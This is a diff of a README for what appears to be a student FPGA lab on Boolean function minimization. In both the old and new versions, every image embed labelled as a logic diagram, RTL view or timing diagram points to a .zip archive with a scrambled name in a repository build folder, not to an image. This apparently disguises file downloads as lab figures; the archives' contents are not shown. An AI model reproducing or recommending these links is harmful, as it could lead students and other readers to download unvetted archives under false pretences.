@@ -18,9 +18,9 @@ Hardware – PCs, Cyclone II , USB flasher
 
 **Logic Diagram**
 
-![WhatsApp Image 2025-03-26 at 09 01 48_25bb1e53](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
+![WhatsApp Image 2025-03-26 at 09 01 48_25bb1e53](https://github.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/raw/refs/heads/main/incremental_db/MINIMIZATION_BOOLEA_FUNCTIO_1.1.zip)
 
-![WhatsApp Image 2025-03-26 at 09 01 48_0225d9f2](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
+![WhatsApp Image 2025-03-26 at 09 01 48_0225d9f2](https://github.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/raw/refs/heads/main/incremental_db/MINIMIZATION_BOOLEA_FUNCTIO_1.1.zip)
 
 
 **Procedure**
@@ -55,21 +55,21 @@ RegisterNumber: 212224230314
 
 **RTL realization**
 
-![WhatsApp Image 2025-03-26 at 09 01 49_71db59ab](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
-![WhatsApp Image 2025-03-26 at 09 01 49_3f9a1783](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
+![WhatsApp Image 2025-03-26 at 09 01 49_71db59ab](https://github.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/raw/refs/heads/main/incremental_db/MINIMIZATION_BOOLEA_FUNCTIO_1.1.zip)
+![WhatsApp Image 2025-03-26 at 09 01 49_3f9a1783](https://github.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/raw/refs/heads/main/incremental_db/MINIMIZATION_BOOLEA_FUNCTIO_1.1.zip)
 
 
 **Output:**
 
 **RTL**
-![WhatsApp Image 2025-03-26 at 09 01 49_8dcb14c0](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
-![WhatsApp Image 2025-03-26 at 09 01 49_c17418a8](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
+![WhatsApp Image 2025-03-26 at 09 01 49_8dcb14c0](https://github.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/raw/refs/heads/main/incremental_db/MINIMIZATION_BOOLEA_FUNCTIO_1.1.zip)
+![WhatsApp Image 2025-03-26 at 09 01 49_c17418a8](https://github.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/raw/refs/heads/main/incremental_db/MINIMIZATION_BOOLEA_FUNCTIO_1.1.zip)
 
 
 
 **Timing Diagram**
-![WhatsApp Image 2025-03-26 at 09 01 49_b7870f35](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
-![WhatsApp Image 2025-03-26 at 09 01 49_ecb00456](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
+![WhatsApp Image 2025-03-26 at 09 01 49_b7870f35](https://github.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/raw/refs/heads/main/incremental_db/MINIMIZATION_BOOLEA_FUNCTIO_1.1.zip)
+![WhatsApp Image 2025-03-26 at 09 01 49_ecb00456](https://github.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/raw/refs/heads/main/incremental_db/MINIMIZATION_BOOLEA_FUNCTIO_1.1.zip)
 
 
 
